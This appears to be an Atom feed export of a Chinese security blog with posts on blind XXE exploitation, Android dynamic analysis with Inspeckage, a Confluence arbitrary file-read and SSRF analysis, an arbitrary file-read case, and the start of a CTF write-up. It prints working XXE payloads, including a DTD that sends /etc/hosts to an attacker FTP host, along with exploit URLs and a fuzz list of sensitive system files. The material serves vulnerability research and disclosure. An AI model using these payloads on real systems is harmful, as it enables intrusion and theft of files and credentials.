    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a><br><a href="https://www.92aq.com/2016/01/31/xxeinjector-xxe.html" target="_blank" rel="external">XXEinjector – XXE自动化测试工具</a></p>
<h2 id="漏洞探测">漏洞探测</h2><p>关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。<br>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
<p>测试payload:</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://sss.5510eb.dnslog.info/file.dtd"&gt;%remote;]&gt;</span>
</code></pre><h2 id="文件读取">文件读取</h2><p>使用参考资料中的一些payload，发现并没有复现成功。后来发现使用<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="external">XXEinjector</a>可以非常方便的验证漏洞。</p>
<pre><code><span class="string">.</span><span class="comment">/XXEinjector</span><span class="string">.</span><span class="comment">rb</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">host=22</span><span class="string">.</span><span class="comment">28</span><span class="string">.</span><span class="comment">98</span><span class="string">.</span><span class="comment">149</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">file=/root/XXEinjector/test</span><span class="string">.</span><span class="comment">txt</span>  <span class="literal">-</span><span class="literal">-</span><span class="comment">path=/etc/hosts</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">verbose</span> 
</code></pre><p>命令可以读取hosts文件。XXEinjector.rb会自动开启http服务提供恶意dtd和开启ftp服务接受传送回来的文件信息。</p>
<p><img src="/images/onexxe3.png" alt=""></p>
<p>经过抓包分析XXEinjector的工作原理。</p>
<p>使用的第一个payload为：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://xxxxxx:80/file.dtd"&gt;%remote;%int;%trick;]&gt;</span><span class="tag">&lt;<span class="title">request</span> <span class="attribute">nickname</span>=<span class="value">"test"</span> <span class="attribute">serial</span>=<span class="value">"ELISALIVE2-"</span> <span class="attribute">user</span>=<span class="value">""</span> <span class="attribute">swd</span>=<span class="value">"+=="</span> <span class="attribute">port</span>=<span class="value">"0"</span> <span class="attribute">version</span>=<span class="value">"1.0"</span>&gt;</span><span class="tag">&lt;/<span class="title">request</span>&gt;</span>
</code></pre><p>file.dtd内容为：</p>
<pre><code>&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% payl SYSTEM "file:///etc/hosts"&gt;</span>
&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% int "&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://xxxxxxx:21/%payl;'&gt;"&gt;</span>
</code></pre><p>然后ftp就会接受到hosts文件数据。</p>
<p>使用提取的payload用burp测试可以获取数据。<br><img src="/images/onexxe2.png" alt=""></p>
<h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet)，根据相应的库的方式禁用外部实体解析。</p>
<h2 id="备注">备注</h2><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.t00ls.net/articles-32919.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;关于Blind XXE&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;htt
    
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="XXE" scheme="http://xdxd.love/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>安卓分析工具Inspeckage介绍</title>
    <link href="http://xdxd.love/2016/08/09/%E5%AE%89%E5%8D%93%E5%88%86%E6%9E%90%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7Inspeckage%E4%BB%8B%E7%BB%8D/"/>
    <id>http://xdxd.love/2016/08/09/安卓分析辅助工具Inspeckage介绍/</id>
    <published>2016-08-09T07:12:04.000Z</published>
    <updated>2016-08-09T08:00:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:<a href="http://repo.xposed.info/module/mobi.acpm.inspeckage" target="_blank" rel="external">Inspeckage - Android Package Inspector</a></p>
<p>Inspeckage的安装就不赘述了，参考xposed框架的安装以及使用。下面主要介绍一下Inspeckage的功能和使用。</p>
<p>安装之后，可以在桌面上看到inspeckage的图标。点开之后主界面如下：</p>
<p><img src="/images/inspeckage3.png" alt=""></p>
<p>在choose target下拉列表中选择要分析的app，这里以乌云峰会puzzle1中的apk为例进行介绍。然后在电脑的terminal中执行</p>
<p><code>adb forward tcp:8008 tcp:8008</code></p>
<p>转发手机的8008端口到本地。在电脑上访问<a href="http://127.0.0.1:8008" target="_blank" rel="external">http://127.0.0.1:8008</a> 就可以看到inspeckage的web界面了。</p>
<p><img src="/images/inspeckage5.png" alt=""></p>
<p>如图所示，inspeckage提供了对所分析apk的一些基本信息，提供直接下载apk到电脑，截图手机屏幕等辅助功能，最核心的功能是监控share preferences，加解密函数的使用，http访问等。下面一一分析。</p>
<p>设置选项中，提供了ssl uncheck，设置代理等。经过测试发现SSL uncheck效果一般。https流量依然很多抓不到。</p>
<p><img src="/images/inspeckage6.png" alt=""></p>
<p>使用logcat功能需要先转发端口到本地。<code>adb forward tcp:8887 tcp:8887</code></p>
<p>点击start，再点connect就可以在网页中实时查看该app的logcat输出。</p>
<p><img src="/images/inspeckage8.png" alt=""></p>
<p>Tree view按钮可以实时浏览app的数据目录并直接下载文件到本地。</p>
<p><img src="/images/inspeckage7.png" alt=""></p>
<p>wooyun这个puzzle的writeup中是使用smali插桩的方式打印出了aes加密的密钥。</p>
<p><img src="/images/inspeckage10.png" alt=""></p>
<p>如果采用inspeckage来分析的话，直接在crypto记录中就可以看到。</p>
<p><img src="/images/inspeckage11.png" alt=""></p>
<p>由于这个apk采用的md5方法是写在so中的，所以inspeckage的hash记录中并没有相关的记录。这个可以采用hook自定义函数的方式来解决。<br>反编译apk，找到调用so的方法为getPart2，同理其实也可以手动hookgetPart1。<br><img src="/images/inspeckage12.png" alt=""></p>
<p>设置好hook的方法后，重启app生效。</p>
<p><img src="/images/inspeckage13.png" alt=""></p>
<p>在hook的记录中可以看到getPart2的返回值。Inspeckage在动态分析apk的过程可以快速获得一些信息，节省分析的时间。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Inspeckage是一个用来动态分析安卓app的xposed模块。Inspeckage对动态分析很多常用的功能进行了汇总并且内建一个webserver。整个分析操作可以在友好的界面环境中进行。可以参考:&lt;a href=&quot;http://repo.xposed.info/mo
    
    </summary>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="inspeckage" scheme="http://xdxd.love/tags/inspeckage/"/>
    
  </entry>
  
  <entry>
    <title>confluence任意文件读取漏洞以及CVE-2016-6596 SSRF漏洞分析</title>
    <link href="http://xdxd.love/2016/06/03/confluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/06/03/confluence任意文件读取漏洞分析/</id>
    <published>2016-06-03T09:29:03.000Z</published>
    <updated>2016-09-23T05:46:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="poc">poc</h2><p><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">exploit-db</a>中提供了poc，可以读取confluence配置文件。后来跟漏洞发现者邮件沟通得知他也是通过黑盒测试的方式发现这个漏洞的。<a href="http://zone.wooyun.org/content/27104" target="_blank" rel="external">有关Atlassian Confluence信息泄露漏洞的尝试</a>中分析了使用了../../无法跳到系统根目录，但是可以使用file://协议读取系统文件。所以这个漏洞的危害是读取任意系统文件。</p>
<h2 id="漏洞分析">漏洞分析</h2><p>经过fuzz发现某些特殊字符会导致系统500，报错。比如<code>%0a</code></p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/115.159.160.174:8099/spaces</span><span class="regexp">/viewdefaultdecorator.action?decoratorName=file:/</span><span class="regexp">//etc</span><span class="regexp">/passwdd%0a</span>
</code></pre><p>获得stack trace信息</p>
<p><img src="/images/confluence7.png" alt=""></p>
<p>反编译存在漏洞的confluence jar文件获得源代码。</p>
<p>jar文件目录为：/opt/atlassian/confluence/lib</p>
<p>使用<a href="https://github.com/kwart/jd-cmd" target="_blank" rel="external">jd-cmd</a>反编译jar。命令为：</p>
<pre><code>./jd-cli ../confluence/<span class="class"><span class="keyword">lib</span>/*.<span class="title">jar</span> -<span class="title">od</span> <span class="title">test</span></span>
</code></pre><p>根据stack trace定位com.atlassian.confluence.admin.actions.lookandfeel.ViewDefaultDecoratorAction.execute方法。其实第一次分析，是通过查找字符串的方式定位代码的，后来发现可以通过stack trace快速定位。</p>
<pre><code>public <span class="class"><span class="keyword">class</span> <span class="title">ViewDefaultDecoratorAction</span>
  <span class="keyword">extends</span> <span class="title">AbstractDecoratorAction</span>
  <span class="keyword">implements</span> <span class="title">LookAndFeel</span>
</span>{
  private <span class="literal">static</span> <span class="keyword">final</span> <span class="built_in">String</span> HTML_QUOTE = <span class="string">"&amp;quot;"</span>;

  public <span class="built_in">String</span> execute()
    throws Exception
  {
    <span class="built_in">String</span> template = readDefaultTemplate();
    <span class="keyword">if</span> (template == <span class="keyword">null</span>)
    {
      addActionError(<span class="string">"template.not.found"</span>, <span class="keyword">new</span> <span class="built_in">String</span>[] { decoratorName });
      <span class="keyword">return</span> <span class="string">"success"</span>;
    }
    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> StringReader(template));

    <span class="built_in">String</span> decoratorSource = <span class="string">""</span>;
    <span class="built_in">String</span> s;
    <span class="keyword">while</span> ((s = br.readLine()) != <span class="keyword">null</span>) {
      decoratorSource = decoratorSource + getIndent(s) + GeneralUtil.htmlEncode(s) + <span class="string">"&lt;br/&gt;"</span>;
    }
    setContent(linkIncludes(decoratorSource));

    <span class="keyword">return</span> <span class="string">"success"</span>;
  }
</code></pre><p>跟进readDefaultTemplate方法：</p>
<pre><code><span class="keyword">public</span> <span class="keyword">abstract</span> class AbstractDecoratorAction
  extends AbstractLookAndFeelAction
{
  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger <span class="built_in">log</span> = LoggerFactory.getLogger(AbstractDecoratorAction.class);
  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> KLUDGE_WWRESOURCE_TEMPLATE = <span class="string">"decorators/wwloader.vmd"</span>;
  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> KLUDGE_CLASSPATH_TEMPLATE = <span class="string">"com/atlassian/confluence/cploader.vm"</span>;
  <span class="keyword">String</span> content;
  <span class="keyword">protected</span> <span class="keyword">String</span> decoratorName;

  <span class="keyword">protected</span> <span class="keyword">String</span> readDefaultTemplate()
  {
    <span class="keyword">String</span> templateSource = getTemplateFromResourceLoader(<span class="string">"decorators/wwloader.vmd"</span>, decoratorName);
    <span class="keyword">if</span> (templateSource == <span class="keyword">null</span>) {
      templateSource = getTemplateFromResourceLoader(<span class="string">"com/atlassian/confluence/cploader.vm"</span>, decoratorName);
    }
    <span class="keyword">if</span> (templateSource == <span class="keyword">null</span>) {
      <span class="built_in">log</span>.warn(<span class="string">"Couldn't load default template source for "</span> + decoratorName);
    }
    <span class="keyword">return</span> templateSource;
  }

  <span class="keyword">protected</span> <span class="keyword">String</span> getTemplateFromResourceLoader(<span class="keyword">String</span> knownTemplatePath, <span class="keyword">String</span> templateToRetrieve)
  {
    <span class="keyword">if</span> ((!<span class="string">""</span>.equals(decoratorName)) &amp;&amp; (isUnderConfluenceApp(ServletContextThreadLocal.getRequest(), decoratorName)) &amp;&amp; (
      (decoratorName.endsWith(<span class="string">".vm"</span>)) || (decoratorName.endsWith(<span class="string">".vmd"</span>)))) {
      <span class="keyword">try</span>
      {
        Template t = VelocityManager.getInstance().getVelocityEngine().getTemplate(knownTemplatePath);
        <span class="keyword">return</span> getTemplateSource(templateToRetrieve, t.getResourceLoader(), t.getEncoding());
      }
      <span class="keyword">catch</span> (Exception e)
      {
        <span class="keyword">return</span> <span class="keyword">null</span>;
      }
    }
    <span class="keyword">return</span> <span class="keyword">null</span>;
  }

  <span class="keyword">protected</span> <span class="keyword">String</span> getTemplateSource(<span class="keyword">String</span> template, ResourceLoader resourceLoader, <span class="keyword">String</span> encoding)
  {
    <span class="keyword">String</span> result = <span class="string">""</span>;
    InputStream is = <span class="keyword">null</span>;
    <span class="keyword">try</span>
    {
      is = resourceLoader.getResourceStream(template);
      <span class="keyword">BufferedReader</span> br = <span class="keyword">new</span> <span class="keyword">BufferedReader</span>(<span class="keyword">new</span> InputStreamReader(is, encoding));
      <span class="keyword">while</span> ((s = br.readLine()) != <span class="keyword">null</span>) {
        result = result + s + System.getProperty(<span class="string">"line.separator"</span>);
      }
      <span class="keyword">return</span> result;
    }
    <span class="keyword">catch</span> (Exception e)
    {
      <span class="keyword">String</span> s;
      <span class="built_in">log</span>.warn(<span class="string">"Trouble reading velocity template"</span>, e);
      <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="keyword">finally</span>
    {
      <span class="keyword">if</span> (is != <span class="keyword">null</span>) {
        <span class="keyword">try</span>
        {
          is.close();
        }
        <span class="keyword">catch</span> (IOException e)
        {
          <span class="built_in">log</span>.warn(<span class="string">"Trouble closing velocity template"</span>, e);
        }
      }
    }
  }
</code></pre><p>猜测是框架读取模板文件导致的任意文件读取。反编译最新版的confluence，对比代码。</p>
<p>可以看到getTemplateFromResourceLoader方法增加了一个条件判断。</p>
<pre><code><span class="list">(!<span class="string">""</span>.equals<span class="list">(<span class="keyword">decoratorName</span>)</span>)</span> &amp;&amp; <span class="list">(<span class="keyword">isUnderConfluenceApp</span><span class="list">(<span class="keyword">ServletContextThreadLocal</span>.getRequest<span class="list">()</span>, decoratorName)</span>)</span> &amp;&amp; <span class="list">(
      <span class="list">(<span class="keyword">decoratorName</span>.endsWith<span class="list">(<span class="string">".vm"</span>)</span>)</span> || <span class="list">(<span class="keyword">decoratorName</span>.endsWith<span class="list">(<span class="string">".vmd"</span>)</span>)</span>)</span>
</code></pre><p>判断decoratorName不能为空，且要以.vm或者.vmd结尾。</p>
<pre><code><span class="keyword">protected</span> <span class="keyword">String</span> getTemplateFromResourceLoader(<span class="keyword">String</span> knownTemplatePath, <span class="keyword">String</span> templateToRetrieve)
{
  <span class="keyword">if</span> ((!<span class="string">""</span>.equals(decoratorName)) &amp;&amp; (isUnderConfluenceApp(ServletContextThreadLocal.getRequest(), decoratorName)) &amp;&amp; (
    (decoratorName.endsWith(<span class="string">".vm"</span>)) || (decoratorName.endsWith(<span class="string">".vmd"</span>)))) {
    <span class="keyword">try</span>
    {
      Template t = VelocityManager.getInstance().getVelocityEngine().getTemplate(knownTemplatePath);
      <span class="keyword">return</span> getTemplateSource(templateToRetrieve, t.getResourceLoader(), t.getEncoding());
    }
    <span class="keyword">catch</span> (Exception e)
    {
      <span class="keyword">return</span> <span class="keyword">null</span>;
    }
  }
  <span class="keyword">return</span> <span class="keyword">null</span>;
}
</code></pre><p>在最新版系统系统中新建一个text.vm文件，通过file协议读取，发现可以成功读取。所以confluence是通过文件名结尾这个方式来修复这个任意文件读取漏洞的。如果有file协议阶段的问题，就可能再次导致漏洞。不过目前所知，并没有可以截断的方法。</p>
<p><img src="/images/confluence8.png" alt=""></p>
<h2 id="ssrf问题">ssrf问题</h2><p>这个加载模板的方法支持file协议，通过报错信息可以得知，是通过java.net.URI.create来读取文件的。</p>
<p>尝试其他协议，包括https，ftp协议都是支持的。</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/115.159.160.174:8099/spaces</span><span class="regexp">/viewdefaultdecorator.action?decoratorName=ftp:/</span><span class="regexp">/127.0.0.1:3306/</span>.vm
</code></pre><p><img src="/images/confluence9.png" alt=""></p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/115.159.160.174:8099/spaces</span><span class="regexp">/viewdefaultdecorator.action?decoratorName=https:/</span><span class="regexp">/127.0.0.1:3399/</span>?.vm
</code></pre><p><img src="/images/confluence10.png" alt=""></p>
<p>不知道为什么不支持http。不知道是否做了限制。想尝试通过https302到http测试。但是默认需要https证书正确才可以访问。尝试通过在java添加自签名证书失败。</p>
<h1 id="参考资料">参考资料</h1><p><a href="https://www.exploit-db.com/exploits/39170/" target="_blank" rel="external">https://www.exploit-db.com/exploits/39170/</a><br><a href="http://zone.wooyun.org/content/27104" target="_blank" rel="external">http://zone.wooyun.org/content/27104</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0207331" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0207331</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;poc&quot;&gt;poc&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/39170/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;exploit-db&lt;/a&gt;中提供了poc，可以读取conflu
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>一个任意文件读取漏洞记录</title>
    <link href="http://xdxd.love/2016/05/23/%E4%B8%80%E4%B8%AA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/05/23/一个任意文件读取漏洞分析/</id>
    <published>2016-05-23T07:27:05.000Z</published>
    <updated>2016-05-26T14:05:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/passwd”)和include(“/etc/passwd”)黑盒来看的表现可能一样。而文件包含是可以getshell的，文件读取就只能读取文件。可以通过尝试读取相对路径的脚本文件，比如<code>/read.php?file=read.php</code>的方式，如果可以读取到文件源码，说明是文件读取，如果不能读取到文件源码说明是文件包含。</p>
<h1 id="文件读取">文件读取</h1><p>服务器上有价值的文件主要可以分为3类。通用的系统/应用配置文件，个性化的文件以及web应用的源码文件。而想要读取到一个文件只需要知道这个文件的绝对路径或者相对路径就可以了。</p>
<p>把web应用的源码单独出来是觉得应用源码可以很方便的通过相对路径获取到，不需要费劲得到源码的绝对路径。系统的通用配置文件比如</p>
<pre><code><span class="regexp">/etc/</span>passwd
<span class="regexp">/etc/my</span>.cnf
<span class="regexp">/etc/</span>shadow
<span class="regexp">/etc/</span>sysconfig<span class="regexp">/network-scripts/i</span>fcfg-eth0   ip地址
<span class="regexp">/etc/</span>hosts                                  通常配置了一些内网域名
</code></pre><p>等等可以通过字典的方式来猜解。</p>
<p>这个案例通过passwd中获得的用户来获取到了这个用户的bash_history，从bash_history获取到了一些压缩包的地址。从而读取到了个性化的文件,一些压缩包的文件。<br><img src="/images/wenjianduqu2.png" alt=""><br><img src="/images/wenjianduqu3.png" alt=""></p>
<p>通过mysql的配置文件得知了数据的存储目录。通过直接读取数据库文件可以获取到数据库内的信息。</p>
<p><img src="/images/wenjianduqu4.png" alt=""></p>
<p>在说到文件包含利用的时候，会讲到有个小技巧，某些情况下可以包含proc下的文件。文件读取的情况下当然可以可以读取proc目录下的文件来获得更多系统的信息。</p>
<p><img src="/images/wenjianduqu5.png" alt=""></p>
<pre><code>/<span class="keyword">proc</span>/sched_debug  提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/<span class="keyword">proc</span>/mounts 挂载的文件系统列表
/<span class="keyword">proc</span>/net/arp  arp表，可以获得内网其他机器的地址
/<span class="keyword">proc</span>/net/route 路由表信息
/<span class="keyword">proc</span>/net/tcp <span class="keyword">and</span> /<span class="keyword">proc</span>/net/udp  活动连接的信息
/<span class="keyword">proc</span>/net/fib_trie 路由缓存
/<span class="keyword">proc</span>/version  内核版本
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/cmdline 可能包含有用的路径信息
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/environ 程序运行的环境变量信息，可以用来包含getshell
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/cwd     当前进程的工作目录
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/fd/[<span class="comment">#]  访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</span>
</code></pre><p>fuzz字典：</p>
<pre><code>/<span class="keyword">proc</span>/self/cmdline
/<span class="keyword">proc</span>/self/stat
/<span class="keyword">proc</span>/self/status
/<span class="keyword">proc</span>/self/environ
/<span class="keyword">proc</span>/verison
/<span class="keyword">proc</span>/cmdline
/<span class="keyword">proc</span>/self/cwd
/<span class="keyword">proc</span>/self/fd/<span class="number">0</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">1</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">2</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">3</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">4</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">5</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">6</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">7</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">8</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">9</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">10</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">11</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">12</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">13</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">14</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">15</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">16</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">17</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">18</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">19</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">20</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">21</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">22</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">23</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">24</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">25</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">26</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">27</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">28</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">29</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">30</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">31</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">32</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">33</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">34</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">35</span>
/<span class="keyword">proc</span>/sched_debug
/<span class="keyword">proc</span>/mounts
/<span class="keyword">proc</span>/net/arp
/<span class="keyword">proc</span>/net/route
/<span class="keyword">proc</span>/net/tcp
/<span class="keyword">proc</span>/net/udp
/<span class="keyword">proc</span>/net/fib_trie
/<span class="keyword">proc</span>/version
</code></pre><h1 id="漏洞分析">漏洞分析</h1><p>读取到应用代码，对漏洞原因进行分析。</p>
<p>通过入口初始化文件读取到配置文件。</p>
<pre><code><span class="comment">/* 初始化设置 END */</span>
<span class="comment">//--------------------------------------------------</span>
<span class="keyword">require</span> (ROOT_PATH <span class="built_in">. </span>ADMIN_PATH <span class="built_in">. </span><span class="string">'/includes/config.php'</span>);
<span class="class"><span class="keyword">define</span></span>(<span class="string">'CLS_PATH'</span>, ROOT_PATH <span class="built_in">. </span>ADMIN_PATH <span class="built_in">. </span><span class="string">'/'</span>);
include ROOT_PATH <span class="built_in">. </span>ADMIN_PATH <span class="built_in">. </span><span class="string">'/includes/base/autoload.class.php'</span>;
autoloader<span class="tag">::init</span>();
<span class="comment">/* 初始化memcached */</span>
<span class="comment">//$cache = new base_memcached();</span>
</code></pre><p>配置文件中自然有数据库账号，这个暂且不说。先看autoload.class.php。autoload实现自动加载类的功能。通过其实现方式拼接出存在漏洞的action类文件路径。</p>
<pre><code>/**
 * 固定路径的class 类文件 以.class.php 结尾
 */
private <span class="keyword">function</span> base_class(<span class="variable">$className</span>) {
    // echo <span class="string">"1 $className&lt;br /&gt;"</span>;
    <span class="variable">$path</span> = array();
    <span class="variable">$pathDir</span> = array();
    <span class="variable">$path</span> = explode(<span class="string">'_'</span>, <span class="variable">$className</span>);
    <span class="variable">$arrCount</span> = count(<span class="variable">$path</span>) - <span class="number">1</span>;
    <span class="variable">$pathDir</span> = implode(<span class="string">"/"</span>, array_slice(<span class="variable">$path</span>, <span class="number">0</span>, <span class="variable">$arrCount</span>));
    // set_include_path(get_include_path() . PATH_SEPARATOR . <span class="string">'/includes/'</span> . <span class="variable">$pathDir</span> . <span class="string">"/"</span>);
    set_include_path(CLS_PATH . <span class="string">"/includes/"</span> . <span class="variable">$pathDir</span>);
    spl_autoload_extensions(<span class="string">'.class.php'</span>);
    spl_autoload(<span class="variable">$path</span>[<span class="variable">$arrCount</span>]);
}
</code></pre><p>读到关键函数的源码：</p>
<pre><code>class models_index {
    public function newsList(<span class="variable">$url</span> = <span class="string">''</span>) {
        <span class="variable">$list</span> = @file_get_contents(<span class="variable">$this</span> -&gt; host.<span class="variable">$url</span>);
        return <span class="variable">$list</span>? <span class="variable">$list</span> : <span class="variable">$this-</span>&gt;getErr(<span class="string">'出错了，没有找到该页面！'</span>);
    public function detail(<span class="variable">$url</span>) {
        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$url</span>);
        return <span class="variable">$content</span>? <span class="variable">$content</span> : <span class="variable">$this-</span>&gt;getErr(<span class="string">'404'</span>,<span class="string">'出错了，没有找到该页面！'</span>);
    }
</code></pre><p>detail 方法获取到了url参数之后直接file_get_contents输出。最典型的任意文件读取漏洞。</p>
<h1 id="修复方案">修复方案</h1><p>白名单用户的输入就可以了。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/27434" target="_blank" rel="external">http://zone.wooyun.org/content/27434</a><br><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" target="_blank" rel="external">https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;黑盒测试&quot;&gt;黑盒测试&lt;/h1&gt;&lt;p&gt;黑盒测试发现某个接口存在任意文件读取的漏洞。&lt;br&gt;&lt;img src=&quot;/images/wenjianduqu1.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;首选判断是文件读取还是文件包含，因为file_get_content(“/etc/
    
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>2016 CCTF writeup之萝莉之旅</title>
    <link href="http://xdxd.love/2016/05/03/2016-CCTF%E4%B9%8B%E8%90%9D%E8%8E%89%E4%B9%8B%E6%97%85/"/>
    <id>http://xdxd.love/2016/05/03/2016-CCTF之萝莉之旅/</id>
    <published>2016-05-03T03:33:35.000Z</published>
    <updated>2016-05-03T08:45:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，感谢花时间精力准备的CCTF。loli1，loli2侥幸拿了一血，先装个逼。<br><img src="/images/cctf1.png" alt=""></p>
